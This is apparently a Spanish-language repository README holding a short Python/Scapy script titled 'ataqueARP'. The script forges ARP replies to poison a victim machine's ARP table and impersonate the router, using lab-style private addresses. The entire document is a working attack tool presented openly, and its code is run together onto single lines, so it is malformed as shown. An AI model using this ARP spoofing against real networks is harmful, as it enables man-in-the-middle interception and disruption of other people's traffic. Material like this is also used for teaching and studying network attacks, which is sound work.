# ataqueARP
#en este se muestra un ataque mediante scappy y phyton para poder cambiar las tablas arp de la maquina vulnerada 

from scapy.all import * 
# Función para enviar un paquete ARP falsificado 
def send_arp_packet(target_ip, target_mac, spoofed_ip, spoofed_mac): arp_response = ARP(op=2, psrc=spoofed_ip, pdst=target_ip, hwsrc=spoofed_mac) send(arp_response, verbose=False) 
# Direcciones MAC e IPs involucradas 
victim_ip = "192.168.100.197" # IP de la víctima 
victim_mac = "08:00:27:67:7B:62" # MAC actual de la víctima 
spoofed_ip = "192.168.100.198" # IP del router (o el que quieras suplantar) 
spoofed_mac = "08:00:27:ee:48:77" # MAC falsificada que deseas poner en la víctima # Enviamos el paquete ARP falsificado 
send_arp_packet(victim_ip, victim_mac, spoofed_ip, spoofed_mac) print(f"Enviado un paquete ARP falsificado a {victim_ip} con la MAC {spoofed_mac}")
